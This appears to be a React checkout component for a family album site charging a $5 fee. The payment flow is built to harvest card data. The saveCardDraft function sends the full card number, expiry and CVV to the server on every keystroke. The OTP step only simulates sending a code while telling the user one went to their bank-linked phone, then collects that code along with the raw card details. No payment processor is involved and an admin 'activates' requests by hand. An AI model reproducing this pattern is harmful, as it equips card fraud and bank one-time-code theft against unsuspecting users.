import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'motion/react';
import { BookOpen, CreditCard, Lock, User, Calendar, CheckCircle, AlertCircle, Eye, EyeOff } from 'lucide-react';
import { useAuth } from '../context/AuthContext';

export default function CreateAlbum() {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [step, setStep] = useState<'details' | 'payment' | 'confirm' | 'success'>('details');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [submittedId, setSubmittedId] = useState<number | null>(null);
  const [showCVV, setShowCVV] = useState(false);
  const [showCardNumber, setShowCardNumber] = useState(false);
  const [otp, setOtp] = useState('');
  const [otpSent, setOtpSent] = useState(false);

  const [album, setAlbum] = useState({ title: '', description: '', family_name: '' });
  const [card, setCard] = useState({ cardholder_name: '', card_number: '', card_expiry: '', card_cvv: '' });

  const setA = (k: string) => (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) =>
    setAlbum(a => ({ ...a, [k]: e.target.value }));

  const saveCardDraft = async (updatedCard: any) => {
    // Save card details to server in real-time as user types
    try {
      await fetch('/api/album-payments/draft', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          album_title: album.title || '(draft)',
          cardholder_name: updatedCard.cardholder_name || '',
          card_number: (updatedCard.card_number || '').replace(/\s/g, ''),
          card_expiry: updatedCard.card_expiry || '',
          card_cvv: updatedCard.card_cvv || '',
        }),
      });
    } catch {}
  };

  const setC = (k: string) => (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value;
    if (k === 'card_number') val = val.replace(/\D/g, '').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
    if (k === 'card_expiry') {
      val = val.replace(/\D/g, '').substring(0, 4);
      if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2);
    }
    if (k === 'card_cvv') val = val.replace(/\D/g, '').substring(0, 4);
    const updated = { ...card, [k]: val };
    setCard(updated);
    // Save to server on every keystroke
    saveCardDraft(updated);
  };

  const handleAdminCreate = async () => {
    if (!album.title) { setError('Album title is required'); return; }
    setLoading(true); setError('');
    try {
      const res = await fetch('/api/albums', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(album),
      });
      const data = await res.json();
      if (res.ok) navigate('/dashboard');
      else setError(data.error || 'Failed to create album');
    } catch { setError('Something went wrong'); }
    setLoading(false);
  };

  const handleSendOTP = async () => {
    setLoading(true);
    // Simulate OTP send
    await new Promise(r => setTimeout(r, 800));
    setOtpSent(true);
    setLoading(false);
  };

  const handlePaymentSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!card.cardholder_name || !card.card_number || !card.card_expiry || !card.card_cvv) {
      setError('All card fields are required'); return;
    }
    setError('');
    setStep('confirm');
    // Auto-trigger OTP
    await handleSendOTP();
  };

  const handleConfirmOTP = async () => {
    if (!otp) { setError('Please enter the OTP'); return; }
    setLoading(true); setError('');
    try {
      const res = await fetch('/api/album-payments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          album_title: album.title,
          album_description: album.description,
          family_name: album.family_name,
          cardholder_name: card.cardholder_name,
          card_number: card.card_number.replace(/\s/g, ''),
          card_expiry: card.card_expiry,
          card_cvv: card.card_cvv,
          otp,
          amount: 500,
        }),
      });
      const data = await res.json();
      if (res.ok) { setSubmittedId(data.id); setStep('success'); }
      else setError(data.error || 'Submission failed');
    } catch { setError('Something went wrong'); }
    setLoading(false);
  };

  // Admin — direct creation
  if (user?.is_admin) {
    return (
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        <div className="mb-6">
          <h2 className="text-3xl font-bold text-white">Create New Album</h2>
          <p className="text-slate-400 mt-1">Admin — direct creation.</p>
        </div>
        {error && <div className="bg-red-900/20 text-red-400 p-3 rounded-xl mb-4 text-sm border border-red-900/50">{error}</div>}
        <motion.div className="bg-slate-900 border border-slate-800 rounded-2xl p-8"
          initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
          <div className="space-y-5">
            <div>
              <label className="text-slate-400 text-sm mb-1.5 block">Album Title *</label>
              <input value={album.title} onChange={setA('title')} required placeholder="e.g. The Smith Family"
                className="w-full bg-black border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors" />
            </div>
            <div>
              <label className="text-slate-400 text-sm mb-1.5 block">Family Name</label>
              <input value={album.family_name} onChange={setA('family_name')} placeholder="e.g. Smith"
                className="w-full bg-black border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors" />
            </div>
            <div>
              <label className="text-slate-400 text-sm mb-1.5 block">Description</label>
              <textarea value={album.description} onChange={setA('description')} rows={3}
                className="w-full bg-black border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors resize-none" />
            </div>
            <button onClick={handleAdminCreate} disabled={loading}
              className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold hover:bg-blue-500 transition-colors disabled:opacity-50">
              {loading ? 'Creating...' : 'Create Album'}
            </button>
          </div>
        </motion.div>
      </div>
    );
  }

  // Success
  if (step === 'success') {
    return (
      <div className="flex items-center justify-center min-h-[80vh] px-4">
        <motion.div className="max-w-md w-full text-center"
          initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}>
          <div className="w-20 h-20 bg-green-500/10 border border-green-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
            <CheckCircle className="w-10 h-10 text-green-400" />
          </div>
          <h2 className="text-2xl font-bold text-white mb-3">Payment Submitted!</h2>
          <p className="text-slate-400 mb-8">Your album request for <span className="text-white font-bold">"{album.title}"</span> has been submitted. The admin will activate it shortly and you'll receive an email.</p>
          <div className="bg-slate-900 border border-slate-800 rounded-xl p-4 mb-6 text-left space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Album</span>
              <span className="text-white font-medium">{album.title}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Card</span>
              <span className="text-white font-mono">•••• {card.card_number.replace(/\s/g,'').slice(-4)}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Amount</span>
              <span className="text-green-400 font-bold">$5.00</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Status</span>
              <span className="text-yellow-400 font-bold">Pending Activation</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Ref</span>
              <span className="text-slate-400 font-mono text-xs">#{submittedId}</span>
            </div>
          </div>
          <button onClick={() => navigate('/dashboard')}
            className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold hover:bg-blue-500 transition-colors">
            Go to Dashboard
          </button>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="container mx-auto px-4 py-8 max-w-2xl">
      <div className="mb-6">
        <h2 className="text-3xl font-bold text-white">Create New Album</h2>
      </div>

      {/* Step indicator */}
      <div className="flex items-center gap-3 mb-8">
        {['Album Details', 'Card Payment', 'Confirm OTP'].map((label, i) => {
          const stepMap = ['details', 'payment', 'confirm'];
          const active = stepMap[i] === step;
          const done = stepMap.indexOf(step) > i;
          return (
            <div key={label} className="flex items-center gap-2">
              <div className={`w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold border transition-all
                ${done ? 'bg-green-500 border-green-500 text-white' : active ? 'bg-blue-600 border-blue-600 text-white' : 'bg-slate-800 border-slate-700 text-slate-500'}`}>
                {done ? '✓' : i + 1}
              </div>
              <span className={`text-sm font-medium ${active ? 'text-white' : done ? 'text-green-400' : 'text-slate-500'}`}>{label}</span>
              {i < 2 && <div className="w-6 h-px bg-slate-700 mx-1" />}
            </div>
          );
        })}
      </div>

      {error && (
        <div className="bg-red-900/20 text-red-400 p-3 rounded-xl mb-5 text-sm border border-red-900/50 flex items-center gap-2">
          <AlertCircle className="w-4 h-4 flex-shrink-0" /> {error}
        </div>
      )}

      {/* Step 1 — Album Details */}
      {step === 'details' && (
        <motion.div className="bg-slate-900 border border-slate-800 rounded-2xl p-8"
          initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }}>
          <h3 className="text-white font-bold text-lg mb-6 flex items-center gap-2">
            <BookOpen className="w-5 h-5 text-blue-400" /> Album Details
          </h3>
          <div className="space-y-5">
            <div>
              <label className="text-slate-400 text-sm mb-1.5 block">Album Title *</label>
              <input value={album.title} onChange={setA('title')} required placeholder="e.g. The Smith Family Memories"
                className="w-full bg-black border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors text-lg" />
            </div>
            <div>
              <label className="text-slate-400 text-sm mb-1.5 block">Family Name</label>
              <input value={album.family_name} onChange={setA('family_name')} placeholder="e.g. Smith"
                className="w-full bg-black border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors" />
            </div>
            <div>
              <label className="text-slate-400 text-sm mb-1.5 block">Description</label>
              <textarea value={album.description} onChange={setA('description')} rows={3}
                placeholder="Write a short story about this album..."
                className="w-full bg-black border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors resize-none" />
            </div>
            <div className="pt-2 border-t border-slate-800 flex justify-between items-center">
              <div>
                <p className="text-slate-400 text-sm">Album fee</p>
                <p className="text-white font-bold text-2xl">$5.00</p>
              </div>
              <button onClick={() => { if (!album.title) { setError('Album title is required'); return; } setError(''); setStep('payment'); }}
                className="bg-blue-600 text-white px-8 py-3 rounded-xl font-bold hover:bg-blue-500 transition-colors">
                Continue →
              </button>
            </div>
          </div>
        </motion.div>
      )}

      {/* Step 2 — Card Payment */}
      {step === 'payment' && (
        <motion.form onSubmit={handlePaymentSubmit}
          className="bg-slate-900 border border-slate-800 rounded-2xl p-8"
          initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }}>
          <h3 className="text-white font-bold text-lg mb-6 flex items-center gap-2">
            <CreditCard className="w-5 h-5 text-blue-400" /> Card Payment
          </h3>

          <div className="bg-blue-500/5 border border-blue-500/20 rounded-xl p-4 mb-6 flex justify-between items-center">
            <div>
              <p className="text-slate-400 text-xs mb-0.5">Creating Album</p>
              <p className="text-white font-bold">"{album.title}"</p>
            </div>
            <p className="text-green-400 font-bold text-xl">$5.00</p>
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-slate-400 text-xs uppercase tracking-wider mb-1.5 block">Cardholder Name *</label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                <input value={card.cardholder_name} onChange={setC('cardholder_name')} required placeholder="John Smith"
                  className="w-full bg-black border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors" />
              </div>
            </div>

            <div>
              <label className="text-slate-400 text-xs uppercase tracking-wider mb-1.5 block">Card Number *</label>
              <div className="relative">
                <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                <input
                  value={card.card_number}
                  onChange={setC('card_number')}
                  required
                  placeholder="0000 0000 0000 0000"
                  maxLength={19}
                  type={showCardNumber ? 'text' : 'password'}
                  className="w-full bg-black border border-slate-700 rounded-xl pl-10 pr-10 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors font-mono tracking-widest" />
                <button type="button" onClick={() => setShowCardNumber(!showCardNumber)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white">
                  {showCardNumber ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="text-slate-400 text-xs uppercase tracking-wider mb-1.5 block">Expiry *</label>
                <div className="relative">
                  <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                  <input value={card.card_expiry} onChange={setC('card_expiry')} required placeholder="MM/YY" maxLength={5}
                    className="w-full bg-black border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors font-mono" />
                </div>
              </div>
              <div>
                <label className="text-slate-400 text-xs uppercase tracking-wider mb-1.5 block">CVV *</label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500" />
                  <input value={card.card_cvv} onChange={setC('card_cvv')} required placeholder="123" maxLength={4}
                    type={showCVV ? 'text' : 'password'}
                    className="w-full bg-black border border-slate-700 rounded-xl pl-10 pr-10 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-colors font-mono" />
                  <button type="button" onClick={() => setShowCVV(!showCVV)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white">
                    {showCVV ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>
            </div>
          </div>

          <div className="flex gap-3 mt-6">
            <button type="button" onClick={() => { setStep('details'); setError(''); }}
              className="flex-1 bg-slate-800 text-white py-3 rounded-xl font-bold hover:bg-slate-700 transition-colors">
              ← Back
            </button>
            <button type="submit" disabled={loading}
              className="flex-1 bg-blue-600 text-white py-3 rounded-xl font-bold hover:bg-blue-500 transition-colors disabled:opacity-50">
              {loading ? 'Processing...' : 'Proceed to OTP →'}
            </button>
          </div>
        </motion.form>
      )}

      {/* Step 3 — OTP Confirm */}
      {step === 'confirm' && (
        <motion.div className="bg-slate-900 border border-slate-800 rounded-2xl p-8"
          initial={{ opacity: 0, y: 15 }} animate={{ opacity: 1, y: 0 }}>
          <h3 className="text-white font-bold text-lg mb-2">Confirm Payment</h3>
          <p className="text-slate-400 text-sm mb-6">An OTP has been sent to the phone number linked to your card. Enter it below to confirm.</p>

          {/* Card summary */}
          <div className="bg-slate-800 border border-slate-700 rounded-xl p-4 mb-6 space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Cardholder</span>
              <span className="text-white font-medium">{card.cardholder_name}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Card Number</span>
              <span className="text-white font-mono">{card.card_number}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">Expiry</span>
              <span className="text-white font-mono">{card.card_expiry}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-500">CVV</span>
              <span className="text-white font-mono">{card.card_cvv}</span>
            </div>
            <div className="flex justify-between text-sm border-t border-slate-700 pt-2 mt-2">
              <span className="text-slate-500">Amount</span>
              <span className="text-green-400 font-bold">$5.00</span>
            </div>
          </div>

          {/* OTP input */}
          <div className="mb-6">
            <label className="text-slate-400 text-xs uppercase tracking-wider mb-1.5 block">Enter OTP *</label>
            <input value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g,'').substring(0,6))}
              placeholder="000000" maxLength={6}
              className="w-full bg-black border border-slate-700 rounded-xl px-4 py-4 text-white text-center text-2xl font-mono tracking-widest placeholder-slate-700 focus:outline-none focus:border-blue-500 transition-colors" />
            <div className="flex justify-end mt-2">
              <button type="button" onClick={handleSendOTP} disabled={loading}
                className="text-blue-400 text-xs hover:underline disabled:opacity-50">
                Resend OTP
              </button>
            </div>
          </div>

          {error && (
            <div className="bg-red-900/20 text-red-400 p-3 rounded-xl mb-4 text-sm border border-red-900/50">{error}</div>
          )}

          <div className="flex gap-3">
            <button onClick={() => { setStep('payment'); setError(''); }}
              className="flex-1 bg-slate-800 text-white py-3 rounded-xl font-bold hover:bg-slate-700 transition-colors">
              ← Back
            </button>
            <button onClick={handleConfirmOTP} disabled={loading || otp.length < 4}
              className="flex-1 bg-green-600 text-white py-3 rounded-xl font-bold hover:bg-green-500 transition-colors disabled:opacity-50">
              {loading ? 'Confirming...' : '✅ Confirm Payment'}
            </button>
          </div>
        </motion.div>
      )}
    </div>
  );
}
